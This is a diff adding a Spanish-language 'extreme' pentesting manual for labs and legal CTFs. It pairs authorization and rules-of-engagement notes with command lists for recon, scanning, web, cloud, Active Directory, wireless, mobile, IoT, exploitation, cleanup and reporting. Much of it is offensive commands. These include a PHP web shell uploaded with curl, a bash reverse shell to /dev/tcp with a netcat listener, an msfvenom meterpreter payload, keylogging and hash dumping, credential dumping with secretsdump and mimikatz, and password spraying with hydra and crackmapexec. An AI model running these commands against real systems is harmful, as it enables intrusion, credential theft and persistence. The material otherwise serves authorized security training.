@@ -1666,3 +1666,396 @@ echo "[ ] Checklists por dominio creados y actualizados
 Resultado esperado:
 
 echo "Todas las herramientas de documentación, plantillas y referencias están disponibles para soporte de auditorías futuras, asegurando estandarización, trazabilidad y aprendizaje continuo" >> 19_apendices/resultado_punto19.txt
+
+
+---------------------------------------------------
+---------------------------------------------------
+Manual Pentesting Extremo - Laboratorio / CTF Legal - Versión Brutal
+0. Gobierno, Legalidad y Seguridad Operacional
+
+echo "Contrato revisado, alcance, limitaciones, ventanas de prueba, firmas cliente" > 00_preparacion/autorizaciones.txt
+echo "ROE: solo pruebas autorizadas, alertar ante incidentes críticos" > 00_preparacion/roe.txt
+echo "SOC contacto: soc@cliente.com, kill-switch activo, canales seguros" > 00_preparacion/comunicacion.txt
+mkdir -p 00_preparacion/backups
+cp /ruta/importante/* 00_preparacion/backups/
+echo "Rollback listo ante cualquier interrupción" > 00_preparacion/backups/plan.txt
+find . -type f -exec sha256sum {} ; >> 00_preparacion/evidencias_hash.txt
+echo "Fecha,Hora,Accion,Comando,Resultado" > 00_preparacion/evidencias.csv
+gpg --symmetric --cipher-algo AES256 00_preparacion/evidencias.csv
+export SECRET_PASS="valor_super_secreto"
+echo $SECRET_PASS | gpg --symmetric --cipher-algo AES256 > 00_preparacion/secret.gpg
+
+1. Preparación de Entorno Avanzado
+VMs, contenedores, segmentación, VPN, jump-box
+Roles: caja negra / gris / blanca
+Toolchains: recon, web/API, cloud, AD, IoT, móviles, forense, kernel fuzzing
+
+mkdir -p 01_entorno/{VMs,containers,logs,tools}
+export PATH=$PATH:/usr/local/bin:/opt/tools/bin
+
+2. Plan de Test y Amenazas Extremo
+
+echo "Objetivos: captura de flags, escalada, lateral movement, cloud, web, IoT" > 02_plan/objetivos.txt
+echo "Modelo MITRE ATT&CK completo, crown jewels identificadas" > 02_plan/modelos.txt
+echo "Escenarios: externo, interno, wireless, cloud, físico, social" > 02_plan/escenarios.txt
+
+3. Reconocimiento Pasivo / OSINT Avanzado
+
+whois objetivo.com
+dig ANY objetivo.com +short
+sublist3r -d objetivo.com -o 03_recon/subs.txt
+amass enum -d objetivo.com -passive -o 03_recon/amass.txt
+theHarvester -d objetivo.com -b all -l 500 -f 03_recon/harvester.html
+whatweb http://objetivo.com
+wappalyzer-cli http://objetivo.com
+crt.sh/?q=objetivo.com
+exiftool archivos/*
+
+4. Perímetro Externo / Scanning Extremo
+
+nmap -p- -T4 -v -Pn objetivo.com -oN 04_scans/nmap_full.txt
+nmap -sV -sC -p 80,443,22,3389 objetivo.com -oN 04_scans/nmap_service.txt
+sslscan objetivo.com:443
+nmap --script ssl-enum-ciphers -p 443 objetivo.com
+nikto -h http://objetivo.com -o 04_scans/nikto.txt
+dirb http://objetivo.com /usr/share/wordlists/dirb/common.txt -o 04_scans/dirb.txt
+gobuster dir -u http://objetivo.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -o 04_scans/gobuster.txt
+ffuf -u http://objetivo.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403 -o 04_scans/ffuf.json
+testssl.sh objetivo.com
+nmap --script http-waf-detect -p 80,443 objetivo.com
+
+5. Web / APIs / Explotación
+
+feroxbuster -u http://objetivo.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,js -t 50 -o 05_scans/ferox.txt
+burpsuite
+wpscan --url http://objetivo.com --enumerate u,ap,tt,cb
+ffuf -u "http://objetivo.com/item?id=FUZZ" -w ids.txt
+sqlmap -u "http://objetivo.com/item?id=1" --batch --level=5 --risk=2 --dump -o 05_scans/sqlmap
+curl -F "file=@shell.php" http://objetivo.com/upload
+burpsuite (CSRF, XSS)
+postman / scripts fuzzing API
+wsfuzzer / websocket testing
+manual testing lógica de negocio
+
+6. Cloud Extremo (AWS/Azure/GCP)
+
+aws s3 ls
+aws s3api get-bucket-acl --bucket nombre
+aws iam list-users
+aws lambda list-functions
+az storage blob list
+az network nsg list
+az functionapp list
+gcloud storage buckets list
+gcloud storage buckets get-iam-policy
+gcloud functions list
+kubectl get pods --all-namespaces
+docker ps -a
+trivy image imagen:tag
+clair-scanner
+
+7. Red Interna / Lateral Movement
+
+nmap -sP 192.168.0.0/24
+arp-scan -l
+smbclient -L //IP -U ""
+rpcclient -U "" IP -c enumdomusers
+proxychains nmap -sS 10.0.0.0/24
+bloodhound-python -u usuario -p password -d dominio.local
+impacket-secretsdump -just-dc-ntlm usuario:pass@IP
+evil-winrm -i IP -u usuario -p pass
+powersploit / seatbelt / crackmapexec
+
+8. Wireless / BLE / NFC
+
+airodump-ng wlan0mon
+aircrack-ng -w wordlist.txt -b BSSID capture.cap
+reaver -i wlan0mon -b BSSID -vv
+bluetoothctl
+rfidtool
+
+9. Móvil
+
+apktool d app.apk
+mobSF
+frida -U -f com.app -l script.js --no-pause
+objection --gadget com.app explore
+mitmproxy -p 8080
+adb logcat
+
+10. IoT / OT / Hardware
+
+nmap -sV -O IP_dispositivo
+binwalk firmware.bin
+firmware-mod-kit
+iot_fuzzer
+
+11. Ingeniería Social (solo autorizado)
+
+simulación phishing: gophish
+vishing / smishing
+Red Team controlado con safewords
+
+12. Physical (solo autorizado)
+
+observación de accesos, CCTV
+documentación de políticas
+sin forzar cerraduras
+
+13. Post-Explotación / Manejo de Datos
+
+hashcat --force hashes.txt -m 0 -a 3 ?a?a?a?a?a?a?a?a
+mimikatz # privilegios
+meterpreter: hashdump, keyscan_start
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
+scp shell.exe usuario@lab:/tmp
+gpg --symmetric --cipher-algo AES256 datos_sensibles.txt
+
+14. Resiliencia / Purple Team
+
+mapear hallazgos a MITRE ATT&CK
+generar alertas y telemetría
+pruebas controladas con Blue Team
+
+15. Limpieza y Restauración
+
+rm -rf /tmp/shell.exe /tmp/logs
+powershell Remove-Item C:\Users\Public*.tmp
+verify hashes, revert logs
+coordinar con cliente
+
+16. Reporte y Remediación
+
+CVSS, NIST, impacto, plan de remediación
+documentar hallazgos críticos
+reunión de cierre, plan de retest
+
+17. Retest
+
+validación de fixes
+captura evidencia post-fix
+actualización de riesgos
+
+18. Lecciones Aprendidas
+
+retroalimentación
+actualización de playbooks
+roadmap de madurez
+
+19. Apéndices
+
+checklists completos
+matrices OWASP / NIST / MITRE
+plantillas cuaderno y evidencia
+tabla de severidades
+glosario
+
+
+
+-----------------------------------
+--------------------------------------
+
+RESUMEN COMPLETO
+
+Pentesting Extremo – Laboratorio CTF Avanzado
+
+Estructura de carpetas:
+
+mkdir -p ctf_lab/{00_preparacion,01_entorno,02_plan,03_recon,04_scans,05_web,06_cloud,07_interna,08_wireless,09_movil,10_iot,11_social,12_physical,13_explotacion,14_postexp,15_purple,16_limpieza,17_reporte,18_retest,19_lecciones}
+
+Preparación y Legalidad
+
+echo "Contrato revisado, alcance completo, ventanas de prueba" > 00_preparacion/autorizaciones.txt
+echo "ROE: pruebas solo autorizadas, kill-switch activo" > 00_preparacion/roe.txt
+echo "SOC contacto: soc@cliente.com, canales seguros" > 00_preparacion/comunicacion.txt
+
+mkdir -p 00_preparacion/backups
+cp /ruta/importante/* 00_preparacion/backups/
+echo "Rollback listo" > 00_preparacion/backups/plan.txt
+
+find . -type f -exec sha256sum {} ; >> 00_preparacion/evidencias_hash.txt
+echo "Fecha,Hora,Accion,Comando,Resultado" > 00_preparacion/evidencias.csv
+gpg --symmetric --cipher-algo AES256 00_preparacion/evidencias.csv
+
+export SECRET_PASS="valor_super_secreto"
+echo $SECRET_PASS | gpg --symmetric --cipher-algo AES256 > 00_preparacion/secret.gpg
+
+echo "[ ] Contrato revisado [ ] ROE definido [ ] SOC informado [ ] Backups preparados [ ] Evidencias cifradas" > 00_preparacion/checklist.txt
+
+Reconocimiento y Footprinting
+
+amass enum -d objetivo.com -o 03_recon/amass.txt
+sublist3r -d objetivo.com -o 03_recon/subs.txt
+theHarvester -d objetivo.com -b all -l 500 -f 03_recon/harvester.html
+whois objetivo.com > 03_recon/whois.txt
+dig axfr objetivo.com @ns.objetivo.com > 03_recon/zone_transfer.txt
+
+nmap -p- -T4 -v -Pn objetivo.com -oN 04_scans/nmap_full.txt
+nmap -sV -sC -p 80,443,22,3389,3306,6379 objetivo.com -oN 04_scans/nmap_services.txt
+nmap --script vuln -p- objetivo.com -oN 04_scans/vuln_scan.txt
+
+gobuster dir -u http://objetivo.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -o 04_scans/gobuster.txt
+ffuf -u http://objetivo.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403 -o 04_scans/ffuf.json
+
+sslscan objetivo.com:443
+nmap --script ssl-enum-ciphers -p 443 objetivo.com
+
+Escaneo y Enumeración Avanzada
+
+ftp objetivo.com
+
+probar login anónimo
+
+ftp> user anonymous
+
+smbmap -H objetivo.com
+enum4linux -a objetivo.com
+crackmapexec smb objetivo.com -u users.txt -p passwords.txt
+
+ssh usuario@objetivo.com
+nc objetivo.com 22
+
+mysql -h objetivo.com -u root -p
+psql -h objetivo.com -U postgres
+
+nikto -h http://objetivo.com -output 04_scans/nikto.txt
+
+Aplicaciones Web y APIs
+
+dirb http://objetivo.com /usr/share/wordlists/dirb/common.txt -o 05_web/dirb.txt
+burpsuite &
+
+sqlmap -u "http://objetivo.com/page.php?id=1" --batch --dbs --threads=10
+sqlmap -u "http://objetivo.com/api" --json --technique=BEUSTQ --batch
+
+ffuf -u "http://objetivo.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403 -o 05_web/ffuf.txt
+
+dalfox file 05_web/urls.txt -o 05_web/xss_results.txt
+
+hydra -L users.txt -P passwords.txt objetivo.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+
+Cloud (AWS/Azure/GCP)
+
+aws s3 ls --profile default
+aws s3api get-bucket-acl --bucket bucket_objetivo
+aws iam list-users
+aws lambda list-functions
+az storage blob list --account-name myaccount
+gcloud storage buckets list
+
+kubectl get pods --all-namespaces
+kubectl describe pod <pod>
+docker images
+docker inspect <imagen>
+
+Red Interna
+
+nmap -sS -p- 10.10.0.0/24 -oN 07_interna/nmap_internal.txt
+arp-scan -l
+nbtscan 10.10.0.0/24
+
+enum4linux -a 10.10.0.5
+crackmapexec smb 10.10.0.0/24 -u users.txt -p passwords.txt
+
+Pivoting
+
+ssh -L 9000:10.10.0.10:3389 user@bastion
+proxychains nmap -sV 10.10.0.10
+
+Wireless
+
+airodump-ng wlan0
+wash -i wlan0
+aireplay-ng -0 5 -a <BSSID> -c <Cliente> wlan0
+aircrack-ng -w wordlist.txt capture.cap
+
+Móvil
+
+adb shell
+apktool d app.apk -o 09_movil/app
+mitmproxy -p 8080 --mode transparent
+
+ideviceinstaller -l
+class-dump-z -H App.app -o 09_movil/headers
+
+IoT / OT
+
+binwalk firmware.bin -e -C 10_iot/
+strings firmware.bin | less
+nmap -p- -T4 10.0.0.0/24 -oN 10_iot/nmap_iot.txt
+
+Ingeniería Social
+
+setoolkit
+gophish
+echo "Resultado, click, submit" > 11_social/metricas.csv
+
+Physical
+
+echo "Registro físico de control: hora, observación, acción" > 12_physical/log.txt
+
+Explotación avanzada
+
+Buffer overflow
+
+gcc -fno-stack-protector -z execstack vuln.c -o vuln
+./vuln $(python3 -c 'print("A"*200)')
+
+Remote code execution
+
+curl -X POST -d "cmd=whoami" http://objetivo.com/vuln.php
+
+Web shell
+
+echo "<?php system(\$_GET['cmd']); ?>" > 13_explotacion/shell.php
+
+subir y ejecutar con curl o burp
+
+curl -F "file=@shell.php" http://objetivo.com/upload
+
+Fuzzing
+
+wfuzz -c -z file,/usr/share/wordlists/Discovery/Web-Content/big.txt --hc 404 http://objetivo.com/FUZZ
+
+Kernel fuzzing / local
+
+syzkaller -config=config.cfg
+
+Post-Explotación y persistencia
+
+Dump hashes
+
+impacket-secretsdump -target objetivo.com -username user -password pass
+
+Lateral movement
+
+psexec.py dominio/user:pass@10.10.0.10
+wmiexec.py dominio/user:pass@10.10.0.10
+
+Reverse shell
+
+nc -lvnp 4444
+bash -i >& /dev/tcp/10.10.0.20/4444 0>&1
+
+Resiliencia y Purple Team
+
+echo "T1059, T1078, T1210..." > 15_purple/attck_mapeo.txt
+logger "Test alerta Blue Team"
+
+Limpieza
+
+rm -rf /tmp/test*
+rm -f /var/www/html/uploaded_test*
+unset SECRET_PASS
+
+Reporte
+
+echo "Resumen ejecutivo y técnico, evidencias, riesgos CVSS/NIST" > 17_reporte/reporte_final.txt
+
+Retest
+
+nmap -sV objetivo.com -oN 18_retest/retest.txt
+
+Lecciones aprendidas
+
+echo "Actualizar playbooks y procedimientos, roadmap de madurez" > 19_lecciones/lecciones.txt
